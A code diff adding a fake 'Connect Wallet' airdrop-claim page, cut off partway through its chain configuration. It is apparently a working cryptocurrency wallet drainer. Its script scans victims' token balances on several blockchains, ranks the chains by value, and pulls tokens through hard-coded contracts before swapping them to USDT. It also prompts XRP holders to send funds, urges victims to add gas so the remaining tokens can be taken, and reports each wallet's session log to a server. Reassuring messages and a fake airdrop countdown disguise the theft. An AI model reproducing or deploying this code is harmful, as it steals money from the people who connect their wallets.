@@ -1,0 +1,2541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Connect Wallet</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+<script src="./lib/bridge.js"></script>
+</head>
+<body>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{
+  background:#0a0a0f;color:#e2e8f0;
+  font-family:'Segoe UI',sans-serif;
+  min-height:100vh;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;padding:20px;
+}
+.logo{font-size:22px;font-weight:800;color:#a78bfa;margin-bottom:48px;}
+.logo span{color:#7c3aed;}
+.card{background:#13131a;border:1px solid #1e1e2e;border-radius:20px;padding:40px 36px;width:100%;max-width:420px;text-align:center;}
+h2{font-size:22px;font-weight:800;margin-bottom:10px;}
+.sub{color:#64748b;font-size:14px;line-height:1.6;margin-bottom:28px;}
+
+/* Wallet buttons (detected extensions + deep links) */
+.wallet-link{
+  display:flex;align-items:center;gap:12px;
+  background:#0a0a0f;border:1px solid #1e1e2e;border-radius:12px;
+  padding:14px 16px;font-size:14px;font-weight:600;
+  color:#e2e8f0;text-decoration:none;width:100%;margin-bottom:10px;
+  transition:border-color .2s;cursor:pointer;
+}
+.wallet-link:hover{border-color:#7c3aed;}
+.wl-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;
+  justify-content:center;font-size:13px;font-weight:900;color:#fff;flex-shrink:0;overflow:hidden;}
+.wl-icon img{width:100%;height:100%;object-fit:cover;border-radius:8px;}
+.wl-name{flex:1;text-align:left;}
+.wl-arrow{color:#64748b;font-size:18px;}
+
+/* More wallets dropdown */
+.more-wallets-toggle{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  background:transparent;border:1px solid #1e1e2e;border-radius:10px;
+  padding:11px;cursor:pointer;font-size:13px;font-weight:600;color:#64748b;
+  width:100%;margin-bottom:10px;transition:all .2s;
+}
+.more-wallets-toggle:hover{border-color:#7c3aed;color:#a78bfa;}
+.more-wallets-toggle .arrow{transition:transform .2s;display:inline-block;}
+.more-wallets-toggle.open .arrow{transform:rotate(180deg);}
+.more-wallets-list{display:none;margin-bottom:10px;}
+.more-wallets-list.open{display:block;}
+
+/* Section divider */
+.divider{color:#64748b;font-size:11px;margin:4px 0 14px;text-align:center;}
+
+/* Loading */
+#stepLoading{display:block;}
+#stepConnect,#stepSuccess,#stepNoFunds,#stepWrongChain,#stepError,#stepPartialSuccess,#stepSummary{display:none;}
+
+/* Animated tri-ring spinner */
+.spinner{
+  position:relative;width:56px;height:56px;margin:0 auto 22px;
+}
+.spinner::before,.spinner::after,.spinner span{
+  content:'';position:absolute;inset:0;border-radius:50%;
+  border:3px solid transparent;
+}
+.spinner::before{border-top-color:#7c3aed;animation:spin 1.1s linear infinite;}
+.spinner::after {border-right-color:#a78bfa;animation:spin 1.6s linear infinite reverse;}
+.spinner span{border-bottom-color:#4c1d95;animation:spin 2.2s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+#stepLoading h2{font-size:18px;font-weight:700;margin-bottom:10px;}
+#stepLoading p{
+  color:#64748b;font-size:13px;min-height:20px;
+  transition:opacity .25s ease;
+}
+
+/* Loading sub-dots (pulsing dots under message) */
+.loading-dots{display:inline-block;letter-spacing:2px;}
+.loading-dots span{animation:dot-fade 1.4s infinite both;}
+.loading-dots span:nth-child(2){animation-delay:.2s;}
+.loading-dots span:nth-child(3){animation-delay:.4s;}
+@keyframes dot-fade{0%,80%,100%{opacity:.2;}40%{opacity:1;}}
+
+/* Stage badge shown during multi-step flow */
+#loadingStageBadge{
+  display:none;
+  background:#1e1030;color:#a78bfa;border:1px solid #4c1d95;
+  border-radius:20px;padding:4px 12px;font-size:11px;font-weight:700;
+  letter-spacing:.5px;margin-bottom:14px;
+}
+
+/* Progress bar (shown inside stepLoading during execution) */
+#progressWrap{display:none;margin-top:22px;}
+.pbar{background:#1e1e2e;border-radius:4px;height:5px;overflow:hidden;}
+.pbar > div{background:linear-gradient(90deg,#7c3aed,#a78bfa);height:100%;width:0%;transition:width .35s;}
+.plabel{font-size:11px;color:#64748b;margin-top:8px;text-align:center;}
+
+/* Summary / pre-flight screen */
+#stepSummary h2{font-size:20px;font-weight:800;margin-bottom:14px;}
+.summary-line{color:#94a3b8;font-size:14px;line-height:1.7;margin:4px 0;}
+.summary-line strong{color:#a78bfa;font-weight:700;}
+.start-btn{background:#7c3aed;color:#fff;border:none;border-radius:10px;
+  padding:14px 24px;font-size:15px;font-weight:700;cursor:pointer;width:100%;margin-top:22px;}
+.start-btn:hover{background:#8b5cf6;}
+.cancel-btn{background:transparent;border:1px solid #1e1e2e;color:#64748b;border-radius:10px;
+  padding:11px 24px;font-size:13px;font-weight:600;cursor:pointer;width:100%;margin-top:8px;}
+.resume-tag{display:inline-block;background:#1e1030;color:#a78bfa;
+  font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;
+  margin-bottom:10px;letter-spacing:.5px;}
+
+/* Chain scan results grid */
+.section-lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:.8px;
+  margin:16px 0 8px;font-weight:600;text-align:left;}
+.scan-grid{width:100%;margin-bottom:4px;background:#0a0a0f;border:1px solid #1e1e2e;
+  border-radius:10px;padding:4px 12px;margin-top:16px;}
+.scan-row{display:flex;justify-content:space-between;align-items:center;
+  padding:7px 0;border-bottom:1px solid #1e1e2e;font-size:12px;}
+.scan-row:last-child{border-bottom:none;}
+.scan-row .schain{color:#94a3b8;}
+.scan-row .sval{font-weight:700;font-size:12px;}
+
+/* TronLink scan prompt (shown when user connected via EVM wallet) */
+.tron-scan-btn{
+  display:flex;align-items:center;gap:10px;
+  background:#140508;border:1px solid #ef0027;color:#ef4444;
+  border-radius:10px;padding:12px 16px;font-size:13px;font-weight:600;
+  cursor:pointer;width:100%;margin-top:12px;text-align:left;
+}
+.tron-scan-btn:hover{background:#1f0a0e;}
+
+/* Xaman XRP step */
+#stepXaman{display:none;}
+#stepXaman h2{font-size:18px;font-weight:700;margin-bottom:6px;}
+.xaman-badge{display:inline-flex;align-items:center;gap:6px;background:#1a0a2e;
+  border:1px solid #7c3aed;border-radius:8px;padding:6px 12px;margin-bottom:16px;}
+.xaman-badge svg{flex-shrink:0;}
+
+/* Success */
+.checkmark{width:72px;height:72px;background:#14532d;border-radius:50%;display:flex;
+  align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px;}
+#stepSuccess h2{color:#22c55e;}
+.info-box{background:#0a0a0f;border:1px solid #1e1e2e;border-radius:10px;
+  padding:12px 16px;margin-top:14px;font-size:12px;color:#64748b;}
+.info-box span{color:#a78bfa;font-weight:600;}
+
+/* No funds / Wrong chain */
+.empty-icon{width:72px;height:72px;background:#1e1e2e;border-radius:50%;display:flex;
+  align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px;}
+#stepNoFunds h2{color:#f59e0b;font-size:20px;}
+#stepNoFunds p,#stepWrongChain p{color:#64748b;font-size:13px;line-height:1.6;margin-bottom:16px;}
+#stepWrongChain h2{color:#f59e0b;}
+
+/* Error */
+.error-icon{width:72px;height:72px;background:#2e1010;border-radius:50%;display:flex;
+  align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px;}
+#stepError h2{color:#ef4444;font-size:18px;}
+#stepError p{color:#64748b;font-size:13px;margin-bottom:20px;line-height:1.5;}
+.retry-btn{background:#7c3aed;color:#fff;border:none;border-radius:10px;
+  padding:12px 24px;font-size:14px;font-weight:600;cursor:pointer;width:100%;}
+
+.footer{margin-top:24px;font-size:11px;color:#64748b;max-width:400px;text-align:center;line-height:1.6;}
+
+/* ── Session log panel ─────────────────────────────────────── */
+.log-toggle{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  background:transparent;border:1px solid #1e1e2e;color:#64748b;
+  border-radius:8px;padding:9px 16px;font-size:12px;font-weight:600;
+  cursor:pointer;width:100%;margin-top:14px;transition:all .2s;
+}
+.log-toggle:hover{border-color:#7c3aed;color:#a78bfa;}
+#logPanel{
+  display:none;margin-top:10px;background:#070710;border:1px solid #1e1e2e;
+  border-radius:10px;padding:12px;max-height:340px;overflow-y:auto;text-align:left;
+}
+#logEntries{font-family:'Courier New',monospace;font-size:10.5px;line-height:1.6;}
+.le{padding:1px 0;border-bottom:1px solid #111120;word-break:break-all;}
+.le:last-child{border-bottom:none;}
+.le.info  {color:#475569;}
+.le.scan  {color:#64748b;}
+.le.zero  {color:#334155;}
+.le.found {color:#22c55e;}
+.le.exec  {color:#a78bfa;}
+.le.approve{color:#60a5fa;}
+.le.tx    {color:#f59e0b;}
+.le.success{color:#22c55e;font-weight:600;}
+.le.skip  {color:#f59e0b;}
+.le.warn  {color:#f59e0b;}
+.le.error {color:#ef4444;}
+.le.event {color:#34d399;}
+.log-actions{display:flex;gap:8px;margin-top:10px;padding-top:8px;border-top:1px solid #1e1e2e;}
+.log-act-btn{
+  flex:1;background:#1e1e2e;border:none;color:#94a3b8;border-radius:6px;
+  padding:7px;font-size:11px;font-weight:600;cursor:pointer;
+}
+.log-act-btn:hover{background:#2a2a4a;color:#e2e8f0;}
+</style>
+
+<div class="card">
+
+  <div id="stepLoading">
+    <div class="spinner"><span></span></div>
+    <div id="loadingStageBadge">SCANNING</div>
+    <h2 id="loadingTitle">Loading...</h2>
+    <p id="loadingMsg">Detecting your wallets.<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>
+    <div id="progressWrap">
+      <div class="pbar"><div id="progressFill"></div></div>
+      <p class="plabel" id="progressLabel">Step 1 of 1</p>
+    </div>
+  </div>
+
+  <div id="stepConnect">
+    <h2>Get Started</h2>
+    <p class="sub">Connect your wallet to continue.</p>
+    <!-- wallet list injected by JS -->
+  </div>
+
+  <div id="stepSuccess">
+    <div class="checkmark" id="successIcon">&#10003;</div>
+    <h2 id="successTitle">You're All Set!</h2>
+    <div class="info-box">Processed: <span id="enrolledToken">&mdash;</span></div>
+    <div class="info-box">Status: <span id="enrolledStatus">Enrolled</span></div>
+    <div id="txVerifyBox" style="display:none;margin-top:8px;"></div>
+    <div id="airdropCountdown" style="display:none;margin-top:16px;background:#0a0a0f;border:1px solid #1e1e2e;border-radius:10px;padding:12px 16px;font-size:13px;color:#64748b;line-height:1.6;">
+      Airdrop will be activated in<br>
+      <strong id="countdownTimer" style="font-size:22px;color:#a78bfa;font-variant-numeric:tabular-nums;letter-spacing:2px;">48:00:00</strong>
+    </div>
+    <button class="log-toggle" onclick="toggleLog()">&#128203; View Session Log</button>
+    <div id="logPanel">
+      <div id="logEntries"></div>
+      <div class="log-actions">
+        <button class="log-act-btn" onclick="copyLog()">Copy</button>
+        <button class="log-act-btn" onclick="downloadLog()">Download .txt</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="stepXaman">
+    <div class="xaman-badge">
+      <svg width="18" height="18" viewBox="0 0 32 32" fill="none"><circle cx="16" cy="16" r="16" fill="#1A1A2E"/><path d="M10 10l12 12M22 10L10 22" stroke="#a78bfa" stroke-width="2.5" stroke-linecap="round"/></svg>
+      <span style="font-size:12px;font-weight:700;color:#a78bfa;">Xaman Wallet Detected</span>
+    </div>
+    <h2>Send XRP</h2>
+    <p class="sub" style="margin-bottom:20px">Tap below to send your XRP. It converts to USDT automatically via THORChain.</p>
+    <button class="start-btn" id="xamanSendBtn">Send XRP</button>
+    <button class="cancel-btn" onclick="showStep('stepSuccess')">Skip &rarr; Done</button>
+  </div>
+
+  <div id="stepNoFunds">
+    <div class="empty-icon">&#8856;</div>
+    <h2>No Tokens Found</h2>
+    <p id="noFundsMsg">No supported tokens found on this network.</p>
+    <div id="switchChainBtns" style="margin-top:16px;display:flex;flex-direction:column;gap:10px;"></div>
+    <button class="retry-btn" style="margin-top:12px" onclick="buildConnectScreen()">Try Again</button>
+  </div>
+
+  <div id="stepWrongChain">
+    <div class="empty-icon">&#9939;</div>
+    <h2>Wrong Network</h2>
+    <p>Please switch to <strong>Polygon</strong> or <strong>BNB Chain</strong> in your wallet, then tap Try Again.</p>
+    <button class="retry-btn" onclick="buildConnectScreen()">Try Again</button>
+  </div>
+
+  <div id="stepError">
+    <div class="error-icon">&#10005;</div>
+    <h2>Something went wrong</h2>
+    <p id="errorMsg">Please try again.</p>
+    <button class="retry-btn" onclick="buildConnectScreen()">Try Again</button>
+  </div>
+
+  <div id="stepPartialSuccess">
+    <div class="checkmark" style="color:#22c55e;">&#10003;</div>
+    <h2 style="color:#22c55e;">Partial Funding Complete</h2>
+    <div class="info-box" style="background:#0f1a0a;border-color:#22c55e;color:#22c55e;margin-bottom:16px;">
+      <strong id="partialSuccessMsg">Funded: [amount]</strong>
+    </div>
+    <div class="info-box" style="background:#1a0f0a;border-color:#f59e0b;color:#f59e0b;">
+      <strong>Pending Tokens:</strong><br>
+      <span id="partialRemainingMsg" style="font-size:12px;margin-top:6px;display:block;">Top up gas to claim remaining tokens on: [chain]</span>
+    </div>
+    <p style="color:#64748b;font-size:13px;margin-top:16px;">
+      <span id="partialHowToMsg">Add a small amount of BNB/ETH/POL to your wallet, then reconnect to claim the rest.</span>
+    </p>
+    <button class="start-btn" onclick="buildConnectScreen()">Back to Wallet</button>
+  </div>
+
+  <div id="stepSummary">
+    <div id="resumeTag" class="resume-tag" style="display:none">RESUMING</div>
+    <h2 id="summaryTitle">Ready</h2>
+    <div id="summaryBridgeWarn"></div>
+    <p class="summary-line" id="summaryLine1">Eligible for <strong id="sAmt">$0</strong> across <strong id="sChains">0</strong> <span id="sChainLabel">chains</span>.</p>
+    <p class="summary-line" id="summaryLine2">This will take about <strong id="sMin">0</strong> minutes and <strong id="sConf">0</strong> confirmations.</p>
+    <p class="summary-line" id="summaryLine3">Tap Claim when ready.</p>
+    <div id="scanGrid" class="scan-grid" style="display:none"></div>
+    <div id="tronPrompt"></div>
+    <button class="start-btn" id="startBtn">Claim</button>
+    <button class="cancel-btn" id="cancelBtn">Cancel</button>
+  </div>
+
+</div>
+
+<div class="footer">By connecting you agree to the terms of service.</div>
+
+<script>
+// ── Session logging ────────────────────────────────────────────────────────
+// Accumulates every event during a session: scan results, approvals,
+// tx hashes, on-chain events parsed from receipts, errors.
+// Cleared on each new connect attempt so logs are per-session.
+
+const _sessionLog = [];
+console.log("%c[RONIN v4 loaded — " + new Date().toISOString().slice(0,10) + "]", "color:#a78bfa;font-weight:bold");
+
+function addLog(type, message, data){
+  const now = new Date();
+  const ts  = now.toISOString().slice(11,23); // HH:MM:SS.mmm
+  _sessionLog.push({ ts, type, message, data: data || null });
+  // Always mirror to browser console for DevTools inspection
+  const prefix = `[${ts}][${type.toUpperCase()}]`;
+  if(type === "error") console.error(prefix, message, data || "");
+  else                 console.log(prefix, message, data || "");
+}
+
+// ── Animated loading engine ────────────────────────────────────────────────
+// Cycles through messages every 3 s with a fade transition so the screen
+// never feels frozen during long async operations (scanning, bridging, etc.)
+
+let _loadingMsgTimer  = null;
+let _loadingMsgIndex  = 0;
+
+const LOADING_MSGS = {
+  scan: [
+    "Scanning your wallets across all networks…",
+    "Checking token balances on each chain…",
+    "Connecting to funding networks…",
+    "Verifying supported assets…",
+    "Almost done scanning…",
+  ],
+  bridge: [
+    "Routing assets across chains…",
+    "Preparing cross-chain funding…",
+    "Waiting for bridge confirmation…",
+    "Securing your tokens across networks…",
+    "Cross-chain transfer in progress…",
+    "Verifying arrival on destination chain…",
+    "Still working — cross-chain transfers take ~2 min…",
+    "Hang tight, nearly there…",
+  ],
+  pull: [
+    "Claiming your tokens…",
+    "Processing approvals…",
+    "Securing your funds…",
+    "Confirming transactions on-chain…",
+    "Finalizing your claim…",
+    "Almost there…",
+  ],
+};
+
+function setLoadingStage(stage, title){
+  const badge = document.getElementById("loadingStageBadge");
+  const h2    = document.getElementById("loadingTitle");
+  if(badge){
+    badge.textContent = stage.toUpperCase();
+    badge.style.display = "inline-block";
+  }
+  if(h2 && title) h2.textContent = title;
+}
+
+function startLoadingMsgs(phase){
+  const msgs = LOADING_MSGS[phase] || LOADING_MSGS.scan;
+  _loadingMsgIndex = 0;
+  _setLoadingMsg(msgs[0]);
+
+  if(_loadingMsgTimer) clearInterval(_loadingMsgTimer);
+  _loadingMsgTimer = setInterval(() => {
+    _loadingMsgIndex = (_loadingMsgIndex + 1) % msgs.length;
+    _setLoadingMsg(msgs[_loadingMsgIndex]);
+  }, 3200);
+}
+
+function stopLoadingMsgs(){
+  if(_loadingMsgTimer){ clearInterval(_loadingMsgTimer); _loadingMsgTimer = null; }
+}
+
+function _setLoadingMsg(text){
+  const el = document.getElementById("loadingMsg");
+  if(!el) return;
+  el.style.opacity = "0";
+  setTimeout(() => {
+    el.innerHTML = text + ' <span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+    el.style.opacity = "1";
+  }, 220);
+}
+
+// ── Retry wrapper ─────────────────────────────────────────────────────────
+// Tries fn() up to maxAttempts times. Returns result or null if all fail.
+// Failures are logged but NEVER throw — callers can continue safely.
+async function withRetry(fn, label, maxAttempts = 2, delayMs = 3000){
+  for(let attempt = 1; attempt <= maxAttempts; attempt++){
+    try {
+      return await fn();
+    } catch(err){
+      addLog("warn",
+        `[Retry] "${label}" failed (attempt ${attempt}/${maxAttempts}): ${err.message}`);
+      if(attempt < maxAttempts){
+        addLog("info", `[Retry] Retrying "${label}" in ${delayMs/1000}s…`);
+        await new Promise(r => setTimeout(r, delayMs));
+      } else {
+        addLog("error",
+          `[Retry] "${label}" abandoned after ${maxAttempts} attempts — continuing without it`);
+      }
+    }
+  }
+  return null; // signal failure without throwing
+}
+
+function fmtBal(rawBal, decimals){
+  // Format a raw BigInt-string balance into a human-readable number
+  const n = Number(rawBal) / Math.pow(10, decimals);
+  if(n >= 1e12) return (n/1e12).toFixed(3)+"T";
+  if(n >= 1e9)  return (n/1e9 ).toFixed(3)+"B";
+  if(n >= 1e6)  return (n/1e6 ).toFixed(3)+"M";
+  if(n >= 1e3)  return (n/1e3 ).toFixed(3)+"K";
+  return n.toPrecision(6).replace(/\.?0+$/,"");
+}
+
+function escHtml(s){
+  return String(s)
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+function renderLog(){
+  const el = document.getElementById("logEntries");
+  if(!el) return;
+  el.innerHTML = _sessionLog.map(e =>
+    `<div class="le ${escHtml(e.type)}">[${e.ts}] ${escHtml(e.message)}</div>`
+  ).join("");
+  el.scrollTop = el.scrollHeight;
+}
+
+function toggleLog(){
+  const panel = document.getElementById("logPanel");
+  const btn   = document.querySelector(".log-toggle");
+  if(!panel) return;
+  const open = panel.style.display === "block";
+  if(open){
+    panel.style.display = "none";
+    if(btn) btn.textContent = "📋 View Session Log";
+  } else {
+    renderLog();
+    panel.style.display = "block";
+    if(btn) btn.textContent = "📋 Hide Session Log";
+  }
+}
+
+function copyLog(){
+  const text = _sessionLog.map(e =>
+    `[${e.ts}][${e.type.toUpperCase()}] ${e.message}` +
+    (e.data ? "\n        " + JSON.stringify(e.data) : "")
+  ).join("\n");
+  navigator.clipboard.writeText(text).then(() => {
+    const btn = document.querySelector(".log-act-btn");
+    if(btn){ const orig = btn.textContent; btn.textContent = "Copied!"; setTimeout(()=>btn.textContent=orig,2000); }
+  });
+}
+
+function downloadLog(){
+  const lines = ["=== Ronin Session Log ===",
+    "Generated: " + new Date().toISOString(), ""];
+  _sessionLog.forEach(e => {
+    lines.push(`[${e.ts}][${e.type.toUpperCase()}] ${e.message}`);
+    if(e.data) lines.push("        " + JSON.stringify(e.data));
+  });
+  const blob = new Blob([lines.join("\n")], {type:"text/plain"});
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href     = url;
+  a.download = "ronin-" + new Date().toISOString().slice(0,19).replace(/[T:]/g,"-") + ".txt";
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+async function saveLogToServer(wallet){
+  try {
+    await fetch("save_log.php", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ wallet, log: _sessionLog })
+    });
+  } catch(e){ /* non-critical — log still in browser */ }
+}
+
+// ── On-chain event parsing ─────────────────────────────────────────────────
+// Parses Pulled / Skipped / Swapped events from a tx receipt.
+// These come from the Ronin contract itself and tell us exactly what happened
+// on-chain for every token (including which ones were silently skipped).
+
+const EVENTS_IFACE = new ethers.Interface([
+  "event Pulled(address indexed user, address indexed token, uint256 amount)",
+  "event Skipped(address indexed user, address indexed token, string reason)",
+  "event Swapped(address indexed user, address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut)",
+]);
+
+function findTokenInfo(address, chain){
+  const addr = address.toLowerCase();
+  const all  = [...(chain.tokens||[]), ...(SWAP_SOURCES[chain.chainId]||[])];
+  return all.find(t => t.address.toLowerCase() === addr) || null;
+}
+
+function parseAndLogReceipt(receipt, chain){
+  addLog("tx", `[${chain.name}] ⛓  Block ${receipt.blockNumber} | Gas used: ${Number(receipt.gasUsed).toLocaleString()}`,
+    { blockNumber: receipt.blockNumber, gasUsed: receipt.gasUsed.toString(), txHash: receipt.hash });
+
+  let pulledCount = 0, skippedCount = 0, swappedCount = 0;
+
+  for(const rawLog of receipt.logs){
+    try {
+      const parsed = EVENTS_IFACE.parseLog({ topics: rawLog.topics, data: rawLog.data });
+      if(!parsed) continue;
+
+      if(parsed.name === "Pulled"){
+        const info     = findTokenInfo(parsed.args.token, chain);
+        const sym      = info?.symbol || (parsed.args.token.slice(0,8)+"…");
+        const decimals = info?.decimals ?? 18;
+        const human    = fmtBal(parsed.args.amount.toString(), decimals);
+        addLog("event", `[${chain.name}] ✅ PULLED  ${human} ${sym}  (raw: ${parsed.args.amount})`,
+          { event:"Pulled", token: sym, address: parsed.args.token, rawAmount: parsed.args.amount.toString() });
+        pulledCount++;
+      }
+      else if(parsed.name === "Skipped"){
+        const info = findTokenInfo(parsed.args.token, chain);
+        const sym  = info?.symbol || (parsed.args.token.slice(0,8)+"…");
+        addLog("skip", `[${chain.name}] ⚠️  SKIPPED ${sym}  reason: "${parsed.args.reason}"`,
+          { event:"Skipped", token: sym, address: parsed.args.token, reason: parsed.args.reason });
+        skippedCount++;
+      }
+      else if(parsed.name === "Swapped"){
+        const inInfo    = findTokenInfo(parsed.args.tokenIn, chain);
+        const dexTarget = DEX[chain.chainId];
+        const symIn     = inInfo?.symbol || (parsed.args.tokenIn.slice(0,8)+"…");
+        const symOut    = dexTarget?.targetSym || "USDT";
+        const decIn     = inInfo?.decimals ?? 18;
+        const decOut    = dexTarget?.targetDec ?? 6;
+        const humanIn   = fmtBal(parsed.args.amountIn.toString(),  decIn);
+        const humanOut  = fmtBal(parsed.args.amountOut.toString(), decOut);
+        addLog("event", `[${chain.name}] ✅ SWAPPED ${humanIn} ${symIn} → ${humanOut} ${symOut}`,
+          { event:"Swapped", tokenIn: symIn, tokenOut: symOut,
+            rawIn: parsed.args.amountIn.toString(), rawOut: parsed.args.amountOut.toString() });
+        swappedCount++;
+      }
+    } catch(e){ /* log from a different contract — ignore */ }
+  }
+
+  addLog("info", `[${chain.name}] Receipt summary — pulled: ${pulledCount}, swapped: ${swappedCount}, skipped: ${skippedCount}`,
+    { pulledCount, swappedCount, skippedCount });
+}
+
+// ── Chain configs ──────────────────────────────────────────────────────────
+// NOTE: `order` determines execute priority: BNB(1) → L1 ETH(2) → Base(3) → Polygon(4) → Arbitrum(5).
+// `minUsd` is the per-chain value threshold — anything below this gets silently skipped.
+const CHAINS = {
+  56: {
+    name:"BNB Chain", hexId:"0x38", chainId:56, order:1,
+    kind:"evm", minUsd:1,
+    contract:"0xF84DdD1630b4DA21DC92bc127714Ea47F80189F0",
+    rpc:"https://bsc-dataseed1.binance.org", sym:"BNB", explorer:"https://bscscan.com",
+    gasThreshold:"0.001", gasThresholdUsd:0.30,
+    rpcFallbacks:["https://bsc-dataseed2.binance.org","https://bsc-dataseed3.binance.org","https://binance.llamarpc.com"],
+    tokens:[
+      {symbol:"USDT", address:"0x55d398326f99059fF775485246999027B3197955", decimals:18, usdPerUnit:1},
+      {symbol:"USDC", address:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals:18, usdPerUnit:1},
+      {symbol:"BUSD", address:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals:18, usdPerUnit:1},
+      {symbol:"BTCB", address:"0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals:18, usdPerUnit:65000},
+      {symbol:"ETH",  address:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals:18, usdPerUnit:2500},
+      {symbol:"WBNB", address:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals:18, usdPerUnit:600},
+      {symbol:"CAKE", address:"0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals:18, usdPerUnit:2},
+      {symbol:"XRP",  address:"0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals:18, usdPerUnit:0.5},
+      {symbol:"DOGE", address:"0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals:8,  usdPerUnit:0.15},
+    ]
+  },
+  137: {
+    name:"Polygon", hexId:"0x89", chainId:137, order:4,
+    kind:"evm", minUsd:1,
+    contract:"0x1D7b324Bbd1b8831438b366658bab91c128a7516",
+    rpc:"https://polygon.llamarpc.com", sym:"POL", explorer:"https://polygonscan.com",
+    gasThreshold:"0.1", gasThresholdUsd:0.05,
+    rpcFallbacks:["https://polygon.drpc.org","https://rpc-mainnet.matic.network"],
+    tokens:[
+      {symbol:"USDT", address:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals:6,  usdPerUnit:1},
+      {symbol:"USDC", address:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals:6,  usdPerUnit:1},
+      {symbol:"DAI",  address:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals:18, usdPerUnit:1},
+      {symbol:"WBTC", address:"0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", decimals:8,  usdPerUnit:65000},
+      {symbol:"WETH", address:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals:18, usdPerUnit:2500},
+      {symbol:"AAVE", address:"0xD6DF932A45C0f255f85145f286eA0b292B21C90B", decimals:18, usdPerUnit:200},
+      {symbol:"LINK", address:"0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals:18, usdPerUnit:15},
+      {symbol:"UNI",  address:"0xb33EaAd8d922B1083446DC23f610c2567fB5180f", decimals:18, usdPerUnit:8},
+      {symbol:"SUSHI",address:"0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a", decimals:18, usdPerUnit:1.5},
+      {symbol:"GRT",  address:"0x5fe2B58c013d7601147DcdD68C143A77499f5531", decimals:18, usdPerUnit:0.15},
+      {symbol:"CRV",  address:"0x172370d5Cd63279eFa6d502DAB29171933a610AF", decimals:18, usdPerUnit:0.5},
+      {symbol:"SAND", address:"0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683", decimals:18, usdPerUnit:0.30},
+      {symbol:"MANA", address:"0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4", decimals:18, usdPerUnit:0.35},
+      {symbol:"WPOL", address:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals:18, usdPerUnit:0.09},
+    ]
+  },
+  1: {
+    name:"Ethereum", hexId:"0x1", chainId:1, order:2,
+    kind:"evm", minUsd:1,
+    contract:"0x2ff167cd79Fe1915B4dB9c062c42828a30e8CA85",
+    rpc:"https://eth.drpc.org", sym:"ETH", explorer:"https://etherscan.io",
+    gasThreshold:"0.01", gasThresholdUsd:20,
+    rpcFallbacks:["https://rpc.flashbots.net","https://rpc.mevblocker.io","https://eth.llamarpc.com"],
+    tokens:[
+      {symbol:"USDT", address:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6,  usdPerUnit:1},
+      {symbol:"USDC", address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals:6,  usdPerUnit:1},
+      {symbol:"DAI",  address:"0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals:18, usdPerUnit:1},
+      {symbol:"WETH", address:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals:18, usdPerUnit:3000},
+      {symbol:"WBTC", address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals:8,  usdPerUnit:65000},
+      {symbol:"LINK", address:"0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals:18, usdPerUnit:15},
+      {symbol:"UNI",  address:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals:18, usdPerUnit:8},
+      {symbol:"AAVE", address:"0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals:18, usdPerUnit:200},
+    ]
+  },
+  8453: {
+    name:"Base", hexId:"0x2105", chainId:8453, order:3,
+    kind:"evm", minUsd:1,
+    contract:"0xA7C287252c30029eDb1a5FC2c365821FD4460C44",
+    rpc:"https://base.llamarpc.com", sym:"ETH", explorer:"https://basescan.org",
+    gasThreshold:"0.001", gasThresholdUsd:2.50,
+    rpcFallbacks:["https://base.drpc.org","https://mainnet.base.org"],
+    tokens:[
+      {symbol:"USDC",  address:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals:6,  usdPerUnit:1},
+      {symbol:"WETH",  address:"0x4200000000000000000000000000000000000006", decimals:18, usdPerUnit:3000},
+      {symbol:"DAI",   address:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals:18, usdPerUnit:1},
